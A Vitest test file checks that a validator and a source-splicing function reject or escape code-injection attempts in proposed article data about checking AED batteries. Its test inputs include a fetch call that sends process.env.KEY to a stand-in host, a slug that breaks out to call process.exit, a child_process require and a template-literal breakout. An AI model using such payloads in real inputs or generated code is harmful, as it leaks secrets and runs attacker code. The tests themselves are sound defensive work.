import { describe, expect, it } from "vitest";
import { insertArticleIntoSource, validateProposedArticle } from "./article-gap";

const valid = {
  slug: "aed-battery-check",
  title: "ตรวจแบตเตอรี่ AED อย่างไร",
  description: "วิธีตรวจสถานะแบตเตอรี่และแผ่นอิเล็กโทรดของเครื่อง AED ด้วยตัวเอง ทำได้ง่าย ๆ ทุกเดือน",
  read_minutes: 4,
  tags: ["AED", "การดูแลเครื่อง"],
  content: "## หัวข้อ\n\n" + "เนื้อหาบทความ ".repeat(40),
};

const SOURCE = `export const articles: Article[] = [\n  { slug: "x" },\n];\n\nexport function findArticle() {}\n`;

describe("validateProposedArticle", () => {
  it("accepts a well-formed proposal", () => {
    expect(validateProposedArticle(valid).slug).toBe("aed-battery-check");
  });

  it("rejects a read_minutes that is not a plain integer (it lands unquoted in source)", () => {
    expect(() =>
      validateProposedArticle({ ...valid, read_minutes: "(fetch('https://x/?'+process.env.KEY),4)" }),
    ).toThrow(/read_minutes/);
    expect(() => validateProposedArticle({ ...valid, read_minutes: 4.5 })).toThrow(/read_minutes/);
  });

  it("rejects slugs and tags outside the expected shape", () => {
    expect(() => validateProposedArticle({ ...valid, slug: 'a"; process.exit(1); "' })).toThrow(/slug/);
    expect(() => validateProposedArticle({ ...valid, tags: "AED" })).toThrow(/tags/);
    expect(() => validateProposedArticle({ ...valid, tags: [1, 2] })).toThrow(/tags/);
  });

  it("rejects missing or non-string text fields", () => {
    expect(() => validateProposedArticle({ ...valid, title: 42 })).toThrow(/title/);
    expect(() => validateProposedArticle({ ...valid, content: "" })).toThrow(/content/);
    expect(() => validateProposedArticle(null)).toThrow();
  });
});

describe("insertArticleIntoSource", () => {
  it("re-validates before splicing, so an unvalidated object can't inject code", () => {
    const evil = { ...valid, read_minutes: "1 + require('child_process')" } as unknown as typeof valid;
    expect(() => insertArticleIntoSource(SOURCE, evil)).toThrow(/read_minutes/);
  });

  it("escapes template-literal breakouts in content", () => {
    const out = insertArticleIntoSource(SOURCE, { ...valid, content: valid.content + " `${process.env.KEY}`" });
    expect(out).toContain("\\`\\${process.env.KEY}\\`");
    expect(out).toContain("readMinutes: 4,");
  });
});
